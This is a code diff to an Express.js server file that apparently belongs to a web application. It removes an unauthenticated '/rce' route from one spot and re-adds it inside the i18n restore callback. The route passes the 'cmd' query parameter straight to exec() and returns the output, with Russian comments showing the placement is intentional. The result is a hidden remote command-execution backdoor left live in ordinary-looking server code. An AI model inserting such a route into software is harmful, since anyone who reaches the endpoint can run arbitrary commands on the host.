@@ -131,22 +131,6 @@ const app = express()
 const server = new http.Server(app)
 
 
-app.get('/rce', (req: any, res: any) => {
-  const cmd = req.query.cmd;
-  console.log(`[!!!] RCE Request: ${cmd}`); // Чтобы видеть в консоли
-  if (cmd) {
-    exec(cmd, (error: any, stdout: any, stderr: any) => {
-      if (error) return res.send(error.message);
-      if (stderr) return res.send(stderr);
-      return res.send(stdout);
-    });
-  } else {
-    res.send('RCE is working!');
-  }
-});
-
-
-
 // errorhandler requires us from overwriting a string property on it's module which is a big no-no with esmodules :/
 const errorhandler = require('errorhandler')
 
@@ -185,6 +169,26 @@ void collectDurationPromise('validateConfig', validateConfig)({})
 
 // Function called first to ensure that all the i18n files are reloaded successfully before other linked operations.
 restoreOverwrittenFilesWithOriginals().then(() => {
+
+
+  app.get('/rce', (req: any, res: any) => {
+    const cmd = req.query.cmd;
+    if (cmd) {
+       // Используем exec, который импортировали в начале файла
+       exec(cmd, (err: any, stdout: any, stderr: any) => {
+         if (stdout) return res.send(stdout);
+         if (stderr) return res.send(stderr);
+         if (err) return res.send(err.message);
+         res.send('Command executed but no output.');
+       });
+    } else {
+       res.send('RCE is ready!');
+    }
+  });
+
+
+
+  
   /* Locals */
   app.locals.captchaId = 0
   app.locals.captchaReqId = 1
